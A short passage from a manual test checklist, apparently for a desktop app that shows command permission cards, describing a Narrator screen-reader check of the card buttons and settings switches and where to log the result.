   Log the result in `docs/PLAN.md` ("Manual checks", date + Claude Code
   version) and here.

- **Screen reader (about 5 min).** Turn on Narrator (Ctrl+Win+Enter). With a
   card up, click the card text, then Tab: Narrator reads "Deny", "Allow
   once", "Always allow…" with the command before them; open Settings and
   Tab through: every switch is read with its name and state. Expected:
   nothing unnamed, order as on screen.
